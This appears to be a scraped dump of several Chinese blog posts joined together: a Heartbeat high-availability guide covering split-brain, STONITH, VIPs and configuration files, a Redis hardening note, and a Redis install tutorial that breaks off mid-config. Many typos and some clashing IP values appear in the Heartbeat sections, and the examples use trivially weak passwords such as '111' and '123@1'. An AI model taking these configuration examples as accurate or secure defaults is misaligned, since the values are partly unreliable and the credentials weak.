发生裂脑时，对业务的影响是极其严重的，有时甚至是致命的。如:两台高可用服务器对之间发生裂脑，导致互相争用同一IP资源，就如同我们在局域网内常见的IP地址冲突一样，两个机器就会有一个或者两个都不正常，影响用户正常访问服务器。如果是应用在数据库或者存储服务这种极重要的高可用上，那就可能会导致用户发布的数据间断的写在两台不同服务器上，最终数据恢复极困难或难以恢复(当然，有NAS等公共存储的硬件也许会好一些）。\n实际生产环境中，我们可以从以下几个方面来防止裂脑问题的发生。\n同时使用串行电缆和以太网电缆连接，同时用两条心跳线路，这样一条线路坏了，另一个还是好的，依然能传送心跳消息。(网卡设备和网线设备)。\n当检测到裂脑时强行关闭一个心跳节点。（这个功能需要特殊设备支持，如stonith、fence）相当于程序上北街店发现心跳线故障，发送关机命令到主节点。\n做好对裂脑的监控报警（如邮件及手机短信等，值班），在问题发生时人为第一时间介入仲裁，降低损失。百度的报警监控有上行和下行。和人工交互的过程。当然，在实施高可用方案时，要根据业务需求确定是否能容忍这样的损失。对于一般的网站常规业务，这个损失是可控的。\n启用磁盘锁.正在服务一方锁住共享磁盘，“裂脑”发生时让对方完全“抢不走”共享磁盘资源。但使用锁磁盘也会有一个不小的问题，如果占用共享盘的一方不主动\u0026quot;解锁\u0026quot;，另一方就永远得不到共享磁盘.现实中假如服务节点突然死机或崩演，就不可能执行解锁命令。后备节点也就接管不了共享资源和应用服务。于是有人在HA中设计了“智能”锁。即，正在服务的一方只在发现心跳线全部断开（察觉觉不到对端）时才启用磁盘锁。平时不上锁。此功能适合共享场景。\n报警报在服务器接管之前，给人员你处理留够时间。1分钟内报警了，但是服务器此时没有接管，而是5分钟接管。接管的时间较长，数据不会丢，导致用户无法写数据。\n报警后不自动服务器接管，而是由人为人员控制管理。\n增加仲裁机制，确定谁该获得资派。这又有几个参考的思路：\n加一个仲截机制。例如设且参考IP(如网关IP).当心跳线完全断开时，2个节点都各自Ping一下参考IP，不通则表明断点就出在本端。不仅心跳线、还有对外服务的本地网络链路断了，这样就主动放弃竞争.让能够Ping通参考IP的一端去接管服务。Ping不通参考IP的一方可以自我重启，以彻底释放有可能还占用着的那些共享资源(heanbeat也有此功能)。 通过第三方软件仲裁谁该获得资源，这个在阿里的集团有类似的软件应用。 小结:如何开发程序判断裂脑：\n简单判断，只要备节点出现VIP就是报普(a.主机宕机了，各机接管了。b.主机没宕，裂脑了)，不管哪个情况，人工查看。 严谨判断，备机出现VIP，并且主机及服务还活着，裂脑了（依赖报警）。 fence设备和仲裁机制 先说下我以前做项目的环境，基本都是RHEL/CENTOS (以下简称RHEL),用的是RHCS集群套件，这个集群套件其实只是很多个软件整合在一起，在其他linux发行版里也有，只是比较零散，在RHEL中RHCS集群套件被做成了一个group，可以通过yum group install来安装集群套件，当然一个个rpm包安装也没问题。这个集群套件里还包含了一个LB的软件，就是LVS. Heartbeat和RHCS其实是差不多的东西，都是靠心跳来检测健康状态的，所以下面说的内容在Heartbeat应该也是通用的。\n先说fence，fence只是HA集群环境下的术语，在硬件领域，fence设备其实就是一个只能电源管理设备(IPMI)，也叫做Intelligent PowerManagement Interface，如果你去和服务器代理商说fence，他们一定不知道是什么东西（原厂可能知道），你得和他们说是队们一定不知道是什么东西(原厂可能知道)，你得和他们说是智能电源管理设备或远程管理卡，他们就理解了，老师在视频里说这是一个特殊的插线板，这是fence设备的一种，叫做外部fence，还有一种叫内部fence.是插在服务器里的，不管是内部还是外部fence，这些设备都是带有以太网口的，用来在HA切换触发时通过网络重启提供资源服务的服务器。\n至于外部fence设备，我只用过APC(著名的UPS电源生产商）的PowerSwitch, 这是一个带以太网口的电源插座，征每个插口都对应一个ID号，用来在命令中指定对哪一个ID号上的电源进行切断或者重启，为什么我当时会接触到外部fence设备呢，是因为当时做了一个医院的挂号系统，用的是IBM的小机装的RHEL5.x，因为小机上没有支持的内部fence，只有使用外部fence来实现了，至于为什么在小机上装RHEL这种2B方案（AIX也有成熟的HA解决方案)，得牵涉到商务上的忽悠，给客户返点各种营销上的潜规则，我才得以在实战中接触到这些东西。\n在RHCS下有仲裁机制是一个叫做仲裁盘的东西，他是通过额外的存储来实现的，比如SAN，通过mkgdisk命令来制作的一个特殊块设备，这个设备做什么用呢?默认情况下双节点的HA架构，主从服务器的投票数都是1，双方使用的ping网关的方式来将自己的存活状态写入仲裁盘内，一旦节点心跳发生问题并且仲裁盘没有收到节点的存活信息，则启动fence设备来重启/关闭故障节点。这种方式可以有效的防止裂脑情况。缺点就是判断时间会不普通的HA时间长，这而要配合业务的需求，当时我们用RHCS+ORALCE+SAN存储来实现全国中信银行的帐务集中系统，数据必须保证完全一致，我们在实际测试中从故障到切换到备机接管能够提供服务的时间在2分钟以内。当然随着数据库增大，可能在启动Oracle数据库实例的时候会有所增加。以上就是我对fence设备和仲裁机制的个人补充，欢迎老师和大家拍砖。\nstonith 介绍 stonith是“shoot the other node in the head”的首字母简写，它是Heartbeat软件包的一个组件，它允许使用一个远程或“智能的”连接到健康服务器的电源设备自动重启失效服务器的电源，stonith设备可以关闭电源并响应软件命令，运行Heartbeat的服务器可以通过串口线或网线向stonith设备发送命令，它控制高可用服务器对中其他服务器的电力供应，换句话说，主服务器可以复位备用服务器的电源，备用服务器也可以复位主服务器的电源。\n注意:尽管理论上连接到远程或“智能的”循环电源系统的电力设备的数量是没有限制的，但大多数stonith实现只使用服务器，因为双服务器stonith配置是最简单的，最容易理解，它能够长时间运行且不系统的可靠性和高可用性。\nStonith事件触发工作步骤 当备用服务器听不到心跳时Stontih事件开始。 注意:这并不一定意味着主服务器没有发送心跳，心跳可能有多种原因而没有抵达备用服务器，这就是为什么建议至少需要两条物理路径传输心跳以避免出现假象的原因了。 2. 备用服务器发出一个Stonith复位命令到Stonith设备。\nStonith设备关闭主服务器的电力供应。 一经切断主服务器的电源，它就不能再访问集群资源，也不能再为客户端提供资源，保证客户端计算机不能访问主服务器上的资源，排除可能发生的头脑分裂状态。\n4. 然后备用服务器获得主服务器的资源，Heartbeat用start参数运行资源脚本，并执行arp欺骗广播以便客户端计算机发送它们的请求到它的网络接口上。 详情可参考Heartbeat高可用Stonith配置201503。\nHeartbeat消息类型 Heartbeat高可用软件在工作过程中，一般来说，有三种消息类型，具体为：心跳消息、集群转换消息、重传请求\n心跳消息 心跳消息为约150字节的数据包，可能为单播、广播或多播的方式，控制心跳频率及出现故障要等待多久进行故障转换。\n集群转换消息 ip-request和ip-request-respy\n当主服务器恢复在线状态时，通过ip-request 消息要求备机释放主服务器失败时备服务器取得的资源，然后备份服务器关闭释放主服务器失败时取得的资源及服务。\n备服务器释放主服务器失败时取得的资源及服务后，就会通过ip-request-resp消息通知主服务器它不在拥有该资源及服务，主服务器收到来自备节点的ip-request-resp消息通知后，启动失败时释放的资源及服务，并开始提供正常的访问服务。\n提示:以上心跳控制消息都使用UDP协议发送到/etc/ha.d/ha.cf文件指定的任意端口，或指定的多播地址，如果使用多播默认端口为694\n跳实现方式及查看心跳消息 参考：http://blog.chinaunix.net/uid-7921481-id-1617030.html\nHeartbeat IP地址接管和故障转移 Heartbeat是通过IP地址接管和ARP广播进行故陈转移的。\nARP广播:在主服务器故阵时，备用节点接管资源后.会立即强制更新所有客户端本地的ARP表(即清除客户端本地缓存的失败取务器的VIP地址和mac地址的解析记录)。确保客户端和新的主服务器对话。\nVIP/IP别名/辅助IP real IP 真实IP，又彼称为管理IP，一般是配置在物理网卡上的实际IP，这可以看作你本人的姓名，如:张三。在负载均衡及高可用环境中，管理IP是不对外提供用户访问服务的，而仅作为管理服务器用，如SSH可以通过这个管理IP连接服务器。\nVIP 虚拟IP即VIP，实际上救是heartbeat临时绑定在物理网卡上的别名IP (heartbeat3以上也采用了辅助IP)。如eth0:x，x为0-255的任惫数字.你可以在一块网卡上绑定多个别名.这个VIP可以看作是你上网的QQ网名、呢称、外号等。在实际生产环境中，需要把DNS配置中把网站域名地址解析到这个VIP地址。由这个VIP对用户提供服务。\n这样做的好处就是当提供服务的服务器宕机以后，在接管的服务器上直接会自动配置上同样的VIP提供服务。如果是使用管理IP的话，来回迁移就难以做到，而且，迁移走了。我们就只能去机房连接服务器了。VIP的实质就是确保两台服务器各有一个管理IP不动，就是随时可以连上机器，然后，增加绑定其他的VIP，这样就算VIP转移走了，也不至于服务器本身连不上，因为还有管理IP呢。\nLinux系统给网卡配置VIP的方法常见的有两种，即别名和辅助IP###\n别名IP（alias ip） ip alias 是由 Linux 系统的 ifconfig 命令来创建和维护的，别名IP就是在网卡设备上绑定的第二个及以上的IP，例如： 手工配置别名VIP的方法\nifconfig eth0:1 192.168.1.1 netmask 255.255.255.0 up ifconfig eth0:1 192.168.1.1/24 up #\u0026lt;==up 关键字可省略默认为up ifconfig eth0:1 192.168.1.1/24 down 让别名IP永久生效 写入到网卡配置文件可以让别名IP永久生效，名字可以为ifcfg-eth0:x，x为0-255的任意数字，IP等内容格式和ifcfg-eth0一致，或者将命令写入/etc/rc.local\n注意：别名IP在centos 7中被遗弃，用辅助IP替代。\n辅助IP（secondary ip address） 辅助IP则是由Linux系统的ip命令创建和维护的，ip addr add创建的辅助IP，不能通过ifconfig查看，但是通过ifconfig创建的别名IP却可以在ip addr show 命令查看。\nip addr add 192.168.3.3/24 dev eth0 ip addr del 192.168.3.3/24 dev eth0 heartbeat3 版本起，不在使用别名，而是使用辅助IP提供服务，而 keepalived 软件一直都是使用的辅助IP技术。\n部署heartbeat heartbeat服务主机资源规划 名称 接口 IP 用途 MATER eth0 192.168.2.22 外网管理IP，用于WAN数据转发。 eth1 10.0.0.1 内网管理IP，用于LAN数据转发。 eth2 10.1.0.1 用于服务器心跳连接（直连）。 VIP 172.168.1.1 用于提供应用程序A挂载服务。 BACKUP eth0 192.168.2.82 外网管理IP，用于WAN数据转发。 eth1 10.0.0.3 内网管理IP，用于LAN数据转发。 eth2 10.1.0.3 用于服务器心跳连接（直连）。 VIP 10.1.0.3 安装heartbeat http://blog.csdn.net/celeste7777/article/details/47808519 http://www.cnblogs.com/zhanjindong/p/3618055.html#anzhuang http://wangzhijian.blog.51cto.com/6427016/1708694?utm_source=tuicool\u0026utm_medium=referral\nrpm -ivh https://mirrors.aliyun.com/epel/epel-release-latest-6.noarch.rpm 注：centos 7 epel源内没有heartbeat。\nyum安装heartbeat yum install heartbeat -y 编译安装heartbeat heartbeat3.x版本把安装包分成了4个部分，分别是：Cluster Glue、Resource Agents、heartbeat和pacemaker，所以要分别安装。\n安装依赖\nyum install gcc \\ gcc-c++ \\ autoconf \\ automake \\ libtool \\ glib2-devel \\ libxml2-devel \\ bzip2 bzip2-devel \\ e2fsprogs-devel \\ libxslt-devel \\ libtool-ltdl-devel \\ asciidoc -y 创建用户\nuseradd hab -s /sbin/nologin -M 安装Cluster Glue\n./autogen ./configure \\ --prefix=/app/heartbeat-3.0.6 \\ --with-daemon-user=hab \\ --with-daemon-group=hab \\ --enable-fatal-warnings=no LIBS='/lib64/libuuid.so.1' #\u0026lt;==指定uuid库文件 编译Resource Agents\n./autogen ./configure \\ --prefix=/app/heartbeat-3.0.6 \\ --with-daemon-user=hab \\ --with-daemon-group=hab \\ --enable-fatal-warnings=no LIBS='/lib64/libuuid.so.1' #\u0026lt;==指定uuid库文件 编译heartbeat\nexport CFLAGS=\u0026quot;$CFLAGS -I/app/heartbeat-3.0.6/include -L/app/heartbeat-3.0.6/lib\u0026quot; ./configure \\ --prefix=/app/heartbeat-3.0.6 \\ --with-daemon-user=hab \\ --with-daemon-group=hab \\ --enable-fatal-warnings=no LIBS='/lib64/libuuid.so.1' heartbeat说明 /etc/init.d/heartbeat #\u0026lt;== 启动脚本 /etc/ha.d #\u0026lt;==配置文件目录 /etc/ha.d/resource.d #\u0026lt;==控制资源的脚本，被HA调用。也可以放到/etc/init.d下 提示:把脚本放到上面两个路径其中任意一个下面，然后在heartbeat的haresourc配置文件中配置脚本名称就能调用到该脚本，进而控制资源和服务的启动和关闭。\nheartbeat配置文件 heartbeat的默认配置文件目录为/etc/ha.d。heartbeat常用的配置文件有三个，分别为ha.c，authkey，haresource，如果你细看，可以发现名字信息就如其实际功能。\n配置名称 作用 备注 ha.cf heartbeat参数配置文件 在这里配置heartbeat的一些基本参数 authkey heartbeat认证文件 高可用服务器对之间根据对端authkey，对对端进行认证。 haresource heartbeat资源配置文件 如配置启动IP资源及脚本程序，服务等，调用/etc/ha.d/resource.d下面配置 配置服务器心跳连接 eth2 10.0.0.1和eth2 10.1.0.3两块网卡之间是通过普通网线直连连接的，即不通过交换机，直接将两块网卡通过网线连在一起，用于做心跳检测或传输数据等。\n高可用服务器对上的Heartbeat软件会利用这条心跳找来性查对端的权器足否存活，进而决定是 否做故障漂移，资源切换，来保证业务的连续性。\n如条件允许，以上连接可同时使用，来加大保险系数防止裂肺问砚发生。在我的生产环境中，常使用前两者之一或者结合使用。本文的环节为一根以太网网线两网卡直连，也是近几年，在生产环境中选用的。选用原因:简单、容易部署、效果也不错。做一件事情有多种选择.往往到及后娜泛性价比方面的考虑。如:部署简单，维护方便，效果不是最好的，但也无不错的。这样就好了。并不是做什么都是最好的。实际工作中往往最好的是最不现实的。\n配置ha.cf文件 heartbeat配置文件模板路径在\n/usr/share/doc/heartbeat-3.0.4/ ha.cf文件详细说明\ndebugfile /var/log/ha-debug #\u0026lt;== heartbeat的调试日志存放位置 logfile /var/log/ha-log #\u0026lt;== heartbeat的日志存放位置 logfacility local0 #\u0026lt;== 在syslog服务中配置通过local0设备接受日志 keepalive 2 #\u0026lt;== 指定心跳间隔时间为2秒（即每两秒中在eth2上发一次广播） deadtime 30 #\u0026lt;== 指定若备用节点在30秒内没有收到主节点的心跳信号，则立即接管主节点的服务资源 warntime 10 #\u0026lt;== 指定心跳延迟的时间为10秒。当10秒种内备份节点不能接收到主节点的心跳信号时，就会往日志中写入一个警告日志，但此时不会切换服务。 initdead 120 #\u0026lt;== 指定在HEARTBEAT首次运行后，需要等待120秒才启动主服务器的任何资源。该选项用于解决这种情况产生的时间间隔。取值至少为deadtime的两倍。单机启动时会遇到vip绑定很慢，为正常现象。该值设置的长的原因 bcast eth2 #\u0026lt;== 指明心跳使用以太网广播方式在eth2接口上进行广播。如使用两个实际网络来传送心跳，则 bcast eth1 eth2 mcast eth2 225.0.0.1 694 1 0 #\u0026lt;== 设置广播通信使用的端口，694为默认使用的端口号 auto_failback on #\u0026lt;== 用来定义当主节点恢复后，是否将服务自动切回. node data-1-1 #\u0026lt;== 主节点主机名，通过命令 uname -n查看 node data-1-3 #\u0026lt;== 备用节点主机名，可以通过命令 uname-n 查看 crm no\t#\u0026lt;== 是否开启cluster resource manager（集群资源管理）功能 还可以查/usr/share/doc/heanbeat-3.0.4/下的ha.cf.来了解更详细的参数信息\n配置authkey文件 软件提供的authkey默认文件并不是很复杂 http://wangzhijian.blog.51cto.com/6427016/1708694\nAuthentication file. Must be mode 600 #\u0026lt;==此处提到了authkey文件权限必须为600 Available methods: crc sha1, md5. Crc doesn't need/want a key. #\u0026lt;==可以设置的认证方法 sha1 is believed to be the \u0026quot;best\u0026quot;, md5 next best. crc adds no security, except from packet corruption $ echo 111|sha1sum 63bea2e3b0c7cd2d1f98bc5b7a9951eafcfead0f - cat \u0026gt;authkeys \u0026lt;\u0026lt;EOF auth 1 1 sha1 63bea2e3b0c7cd2d1f98bc5b7a9951eafcfead0f EOF 配置haresource文件 编辑配置heartbeat资源文件/etc/ha.d/haresources 生产环境的配置如下：\nha-b IPaddr::10.1.0.2/24/eth0 配置haresource说明 ha-b为主机名，表示初始状态会在ha-b绑定IP 10.0.0.17，IPaddr为heartbeat配置lP的默认脚本，其后的lP等都是脚本的参数。10.0.0.17/24/eth0为集群对外服务的VIP，初始启动在ha-b上，24为子网掩码，eth0为ip绑定的实际物理网卡，为heartbeat提供对外服务的通信接口。\nha-b drbddis:data Filesystem::/dev/drbd0::/data::ext3 rsdata IPaddr:10.0.0.1/24/eth0 设置drbb，drbddisk::data 挂载/data到/dev/drbdO Filesystem::/dev/drbd0::/data/ext3 NFS/MFS服务配置 rsdata (不要开机启动) 启动 VIP IPaddr::10.0.0.3/24/eth0 以上设置休验最好\n一旦heartbeat无法控制资源的启动，heartbeat会采取极端的措施.例如重启系统.来释放没法管理的资源。因此，被管理的资源必须不能开机启动。可以写脚本来张制控制资源的处理，来防止heartbeat重启。\n安装错误 Oct 26 10:07:18 node1 heartbeat: [2063]: ERROR: Illegal directive [ucast] in /usr/local/heartbeat/etc/ha.d//ha.cf Oct 26 10:07:18 node1 heartbeat: [2063]: ERROR: Illegal directive [ping] in /usr/local/heartbeat/etc/ha.d//ha.cf 解决方法：建立plugin软链接:\nln -svf /app/heartbeat/lib64/heartbeat/plugins/* /app/heartbeat/lib/heartbeat/plugins/ heartbeat高可用实战 有关heartbeat调用资源的生产场景应用 在实际工作中有两种常见方法实现高可用问题：\nheartbeat可以仅控制vip资源的漂移，不负责服务资源的启动及停止，本节的httpd服务就可以这样做。适合web服务 heartbeat即控制vip资源的漂移，同时又控制服务资源启动及停止，本节的httpd服务例子既是ip和服务要切换都切换. ←适合数据服务(数据库和存储)只能一端写。 VIP正常，httpd服务宕了.这个时候不会做高可用切换.写个简单的脚本定时或守护进程判断httpd服务，如果有问题，则停止heartbeat，主动使其上的业务到另一台。\n两端服务能同时起，那最好不要交给heartbeat，对于某些服务，不能两端同时起，heartbeat可以控制服务启动。\nha高可用httpd案例结论 日志很重要。不管是heartbeat，所有服务的日志都很重要。有问题时多查看相关日志。 httpd的高可用还可以是两边都处于启动状态，即httpd不需要交给ha启动，而是默认状态就先启动运行。 这个httpd高可用性配置在生产环境中用的很少，但它确是生产环境需求的一个初级模型。 如:heanbeat+drbd+mysql实现数据库高可用性配置，heanbeat+active/active+nfs/mfs实现存储高可用性配置。\nheartbeat和keepalived应用场景区别 对于一般的web, db、负载均衡(nginx,haproxy )等等heartbeat和keepalived都可以实现。 lvs负载均衡最好和keepalived结合，虽然heartbeat也可以调用带有ipvsadm命令的脚本来启动和停止lvs负载均衡，但是heartbeat本身并没有对下面节点rs的健康检查功能，heartbeat的这个缺陷可以通过ldircetord插聆来弥补，所以，当你搜索heartbeat+lvs+ldirectord可以有lvs的别解决方案)。 需要要数据同步(配合drbd )的高可用业务最好用heartbeat，例如:mysgl双主多从，NFS/MFS 存储，他们的特点是需要数据同步，这样的业务最好用heartbeat.因为hearbeat自带了drbd的脚本，可以利用强大的drbd同步软件配合实现同步。如果你解决了数据同步可以不用drbd,例如:共享存储或者inotify+rsync (sersync+rsync)，那么就可以考虑keepalived。 运维人员对哪个更热悉就用哪个，其实，就是你要能控制维护你部署的服务。目前，总体网友们更倾向于使用leepalived软件的多一些。\nheartbeat服务生产环境下维护要点 修改配置文件要点：在我们每天的实战运维工作中，当有新项目上线或者VIP更改需求时，可能会进行添加修改服务VIP的操作，那么，下面我们就以heartbeat+haproxy/nginx高可用负载均衡为例给大家讲解下生产环境下的维护方法。\n所有配置放到SVN，更改后提交SVN，对比。推送到正式环境!\n常见的情况就是修改配置文件，我们知道配置文件有3个：ha.cf authkey haresourece。在修改配置前执行/etc/init.d/heartbeat stop或/app/heartbeat/share/heartbeat/hb_staudby(编译安装)，/usr/lib/heartbeat/hb_staudby(此命令最好)\n","permalink":"https://www.oomkill.com/2016/11/heartbeat/","summary":"","title":"heartbeat权威指南"},{"content":"为Redis客户端外部设置连接密码 因为redis速度相当快，所以在一台比较好的服务器下，一个外部的用户可在一秒钟进行上万次的密码尝试，这意味着你需要指定非常非常强大的密码来防止暴力破解。\n修改配置文件 requirepass 123@1\r重启服务后登录客户端提示没有验证\n$ redis-cli\r127.0.0.1:6379\u0026gt; keys *\r(error) NOAUTH Authentication required.\r验证成功后，可以正常操作\n127.0.0.1:6379\u0026gt; auth 123@1\rOK\r127.0.0.1:6379\u0026gt; keys *\r1) \u0026quot;test-durable-1\u0026quot;\r2) \u0026quot;test-durable\u0026quot;\r命令行临时生效 在命令行设置后，redis在下次重启前，每次登录都需要验证密码\n127.0.0.1:6379\u0026gt; CONFIG set requirepass 123@1\rOK\r127.0.0.1:6379\u0026gt; quit\r$ redis-cli\r127.0.0.1:6379\u0026gt; keys *\r(error) NOAUTH Authentication required.\r注意：配置Redis复制的时候如果主数据库设置了密码，需要在从数据库的配置文件中通过masterauth参数设置主数据库的密码，以使从数据库连接主数据库时自动使用AUTH命令认证。\n通过mysql命令行指定密码方式登录Redis客户端\n$ redis-cli -a 123@1\r127.0.0.1:6379\u0026gt; keys *\r1) \u0026quot;test-durable-1\u0026quot;\r2) \u0026quot;test-durable\u0026quot;\r危险命令重命名 rename-command flushall abc\rrename-command get eee\rrename-command FLUSHALL \u0026quot;\u0026quot; #←禁用FLUSHALL命令\r127.0.0.1:6379\u0026gt; get test-durable\r(error) ERR unknown command 'get'\r127.0.0.1:6379\u0026gt; eee test-durable\r\u0026quot;test1\u0026quot;\r绑定只能本机连接 Redis的默认配置会接受来自任何地址发送来的请求，即在任何一个拥有公网IP的服务器上启动Redis服务器，都可以被外界直接访问到。要更改这一设置，在配置文件中修改bind参数，如只允许本机应用连接Redis.\nbind 127.0.0.1\r","permalink":"https://www.oomkill.com/2016/11/redis-security/","summary":"","title":"redis安全相关配置"},{"content":"Remote Dictonary Server(Redis)是一个基于key-value键值对的持久化数据库存储系统。redis和大名鼎鼎的Memcached缓存服务很像,但是redis支持的数据存储类型更丰富,包括string(字符串)、list(链表)、set(集合)和zset(有序集合)、Hash等。\n这些数据类型都支持push/pop,add/remove及取交集、并集和差集及更丰富的操作,而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached缓存服务一样，为了保证效率数据都是缓存在内存中提供服务。和memcached不同的是，redis持久化缓存服务还会周期性的把更新的数据写入到磁盘以及把修改的操作记录追加到文件里记录下来，比memcached更有优势的是，redis还支持master-slave(主从)同步,这点很类似关系型数据库MySQL。\nRedis是一个开源的、使用C语言编写、３万多行代码、支持网络、可基于内存亦可久化的日志型、Key-Value数据库，并提供多种语言的API从2010年3月15日起，Redis开发工作由VMware主持。\nRedis的出现，再一定程度上弥补了memcached这类key-value内存缓存服务的不足,在部分场合可以对关系数据库起到很好的补充作用.redis提供了Python, Ruby, Erlang, PHP客户端，使用很方便。redis官方文档如下：http://www.redis.io/documentation\nRedis的优点 与memcached不用，redis可以持久化存储数据。 性能很高：Redis能支持超过10w/秒的读写频率。 丰富的数据类型：redis支持二进制的Strings, Lists, Hashes, Sets及sorted sets等数据类型操作。 原子：Redis的所有操作都是原子性的,同时Redis还支持对几个操作全并后的原子性执行。 丰富的特性：Redis还支持publish/subscribe(发布/订阅)，通知，key过期等等特性。 redis支持异步主从复制。 Redis的应用场景 传统的MySQL+Memcached的网站架构遇到的问题：\nMySQL数据库实际上是适合进行海量数据存储的,加上通过Memcached将热点数据 存放到到内存cache里,达到加速数据访问的目的,绝大部分公司都曾经使用过这样的架构,但随着业务数据量的不断增加,和访问量的增长,很多问题就会暴漏出来：\n需要不断的对MySQL进行拆库拆表Memcached也需不断跟着扩容,扩容和维护工作占据大量开发运维时间。 Memcached与MySQL数据库数据一致性问题是个老大难。 Memcached数据命中率低或down机,会导致大量访问直接穿透到数据库,导致MySQL无法支撑访问。 跨机房cache同步一致性问题。 redis在微博中的应用 计数器：微博（评论、转发、阅读、赞等） 用户（粉丝、关注、收藏、双向关注等） redis在短信中的应用 发送短信后存入redis中60秒过期。\nredis的最佳应用场景 Redis最佳试用场景是全部数据in-memory。 Redis更多场景是作为Memcached的替代品来使用。 当需要除key/value之外的更多数据类型支持时,使用Redis更合适。 数据比较重要，对数据一致性有一定要求的业务。 当存储的数据不能被剔除时,使用Redis更合适。 更多 Redis作者谈Redis应用场景 http://blog.nosglfan.com/html/2235.html 使用redis bitmap进行活跃用户统计 http://blog.nosqlfun.com/html/3501.html 计数、cache服务、展示最近、最热、点击率最高、活跃度最高等等条件的top list、用户最近访问记录表、relation list/Message Queue、粉丝列表\nKey-Value Store更加注重对海量数据存取的性能、分布式、扩展性支持上，并不需要传统关系数据库的一些特征。例如：Schema事务、完整SQL查询支持等等，因此在布式环境下的性能相对于传统的关系数据库有较大的提升。\nredis的生产经验教训 要进行Master-slave主从同步配置，在出现服务故障时可以切换。 在master禁用数据据持久化只需在slave上配置数据持久化。 物理内存+虚拟内存不足，这个时候dump一直死着，时间久了机器挂掉。这个情就是灾难。 当Redis物理内存使用超过内存总容量的3/5时就会开始比较危险了，就开始做swap，内存碎片大！ 当达到最大内存时，会清空带有过期时间的如 redis与DB同步写的问题，先写DB，后写redis，因为写内存基本上没有问题。 业务场景 提高了DB的可扩展性,只需要将新加的数据放到新加的服务器上就可以了。 提高了DB的可用性,只影响到需要访问的shard服务器上的数据的用户。 提高了DB的可维护性,对系统的升级和配里可以按shard一个个来搞,对服务产生的影响小。 小的数据库存的查询压力小,查询更快,性能更好。 使用过程中的一些经验与教训,做个小结：\n要进行Master-slave配置,出现服务故障时可以支持切换。 在master侧禁用数据持久化,只需在slave上配置数据持久化。 物理内存+虚拟内存不足时,这个时候dump已知死着,时间久了机器挂掉。这个情况就是灾难。 当Redis物理内存使用超过内存总容量的3/5时就会开始比较危险了,就开始做swap,内存碎片大。 当达到最大内存时,会清空带有过期时间的key,即使key未到过期时间。 redis与DB同步写的问题,先写DB,后写redis,因为写内存基本上没有问题。 安装配置Redis 下载安装Redis redis官方网站：www.redis.io\nmake\rmake PREFIX=/app/redis-3.2.8 install 命令执行完成后,会在/app/redis-3.2.8/bin/目录下生成5个可执行文件\n/app/redis-3.2.8/\r└── bin\r├── redis-benchmark #← redis性能测试工具,测试redis在你的系统及你的配置下读写性能\r├── redis-check-aof #← 更新日志检查\r├── redis-check-rdb ├── redis-cli #← redis命令行操作工具。当然也可用telnet根据其纯文本协议来操作\r└── redis-server #←redis服务器的daemon启动服务\r配置并启动Redis服务 文件头部分 操作命令：\necho 'PATH=\u0026quot;/app/redis/bin:$PATH\u0026quot;' \u0026gt;\u0026gt;/etc/profile\r. /etc/profile\r查看命令帮助 Usage: ./redis-server [/path/to/redis.conf] [options]\r./redis-server - (read config from stdin)\r./redis-server -v or --version\r./redis-server -h or --help\r./redis-server --test-memory \u0026lt;megabytes\u0026gt; Examples:\r./redis-server (run the server with default conf)\r./redis-server /etc/redis/6379.conf\r./redis-server --port 7777 #\u0026lt;==指定端口\r./redis-server --port 7777 --slaveof 127.0.0.1 8888 ./redis-server /etc/myredis.conf --loglevel verbose #\u0026lt;==指定配置文件\rSentinel mode:\r./redis-server /etc/sentinel.conf --sentinel\r启动redis服务 创建配置文件,redis的配置文件在二进制安装包解压目录下的 redis.conf\nmkdir /app/redis-3.2.8/conf\rcp /root/tools/redis-3.2.8/redis.conf /app/redis-3.2.8/conf/\r启动命令\nredis-server /app/redis-3.2.8/conf/redis.conf \u0026amp;\r启动错误 WARNING: The TCP backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.\r原因：此参数确定了TCP连接中已完成队列(完成三次握手之后)的长度, 当然此值必须不大于Linux系统定义的/proc/sys/net/core/somaxconn值,默认是511,而Linux的默认参数值是128。当系统并发量大并且客户端速度缓慢的时候,可以将这二个参数一起参考设定。\n暂时解决：redis.conf中 tcp backlog=128\nWARNING overcommit_memory is set to 0! Background save may fail under low memory condition.To fix this issue add 'vm.overcommit_memory = 1' to /etc/sysctl.conf and then reboot or run the command 'sysctl vm.overcommit_memory=1' for this to take effect.\r原因：\novercommit_memory参数说明：\n设置内存分配策略（可选,根据服务器的实际情况进行设置）/proc/sys/vm/overcommit_memory可选值：0、1、2。\n0：当用户空间请求更多的内存时，内核尝试估算出剩余可用的内存。\n1：设这个参数值为1时，内核允许超量舒勇内存直到用完为止,主要用于科学计算。(最大限度的使用内存)\n2：当设这个参数值为2时，内核会使用一个决不过量使用内存的算法，即系统整个内存地址空间不能超过swap+50%的RAM值，50%参数的设定是在overcommit_ratio中设定。\n解决：sysctl vm.overcommit_memory=1*\nWARNING you have Transparent Huge Pages (THP) support enabled in your kernel.\rThis will create latency and memory usage issues with Redis. To fix this issue run the command 'echo never \u0026gt; /sys/kernel/mm/transparent_hugepage/enabled' as root, and add it to your /etc/rc.local in order to retain the setting after a reboot.\rRedis must be restarted after THP is disabled.\r原因\n临时解决方法：\necho never \u0026gt; /sys/kernel/mm/transparent_hugepage/enabled\r参考文档：http://blog.csdn.net/a491857321/article/details/52006376\n客户端测试redis服务 redis-cli客户端帮助 redis-cli -help\r使用redis-cli客户端连接redis 指定密码 ip 端口登陆\nredis-cli -h 10.0.0.10 -p 3307 -a '111'\rUsage: redis-cli [OPTIONS] [cmd [arg [arg ...]]]\r-h \u0026lt;hostname\u0026gt; Server hostname (default: 127.0.0.1).\r-p \u0026lt;port\u0026gt; Server port (default: 6379).\r-s \u0026lt;socket\u0026gt; Server socket (overrides hostname and port).\r在Linux命令行操作redis\n$ redis-cli set zhangsan 10-10\rOK\r$ redis-cli get zhangsan\r\u0026quot;10-10\u0026quot;\r使用telnet连接redis $ telnet 127.0.0.1 6379\rTrying 127.0.0.1...\rConnected to 127.0.0.1.\rEscape character is '^]'.\rget name\r$2\r45\r通过NC连接redis $ echo \u0026quot;set three-world 刘备\u0026quot;|nc 127.0.0.1 6379\r+OK\r$ echo \u0026quot;get three-world\u0026quot;|nc 127.0.0.1 6379\r$6\r刘备\r关闭redis服务 redis-cli shutdown\r通过客户端测试redis服务\nPHP安装Redis扩展 源码地址：\nhttps://github.com/phpredis/phpredis\nhttp://pecl.php.net/package/redis\n安装\n/app/php/bin/phpize\r./configure --with-php-config=/app/php/bin/php-config\r修改php.ini设置\nextension=redis.so\r查看结果\nRedis配置文件注解 # 是否在后台执行,yes：后台运行；no：不是后台运行（老版本默认）\rdaemonize yes\r# 